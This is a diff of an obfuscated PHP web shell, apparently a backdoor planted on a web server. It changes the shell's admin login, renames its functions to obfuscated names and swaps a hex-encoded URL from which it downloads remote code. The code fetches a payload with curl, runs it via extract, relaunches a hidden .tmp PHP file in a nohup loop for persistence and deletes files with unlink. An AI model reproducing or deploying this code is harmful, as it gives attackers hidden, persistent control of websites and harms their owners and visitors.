@@ -1,9 +1,9 @@
 <?php
 $GLOBALS['oZgNypoPRU'] = array(
-    'username' => '7htm',
-    'password' => '2503cd7091fd55321ba7725fabcc5a04', //md5(ehsan)
+    'username' => 'admin',
+    'password' => '1a1dc91c907325c69271ddf0c944bc72', // pass
     'safe_mode' => '1',
-    'login_page' => '403',
+    'login_page' => 'gui',
     'show_icons' => '1',
     'post_encryption' => true,
     'cgi_api' => false,
@@ -33,7 +33,7 @@ while (True) {
         _mad_cmd('sh -c "nohup $(nohup php ' . $_t . '/.sessions/.-' . handlerName() . '.tmp < /dev/null &) < /dev/null &"');
     }
 }
-function __fel_Api($url)
+function _oOaA($url)
 {
     if (function_exists("\x63\x75\x72\x6C\x5F\x65\x78\x65\x63")) {
         $conn = curl_init(${"\x75\x72\x6C"});
@@ -53,7 +53,7 @@ function __fel_Api($url)
     return $url_get_contents_data;
 }
 $Array = [
-    '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f72697a74726578782f68636b65722f6d61696e2f616c666f362e68636b',
+    '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f72697a74726578782f68636b65722f6d61696e2f616c666167657432',
     '697a74726578782f68636b65722f6d61696e2f616c666f2e68636b'
 
 ];
@@ -143,7 +143,7 @@ function ____($_____)
     array_map('unlink', glob($_a . "/*.11*"));
     return get_defined_vars();
 }
-$data = __fel_Api($fungsi[0]);
+$data = _oOaA($fungsi[0]);
 if ($data) {
     eXtRaCt(____($data));
 
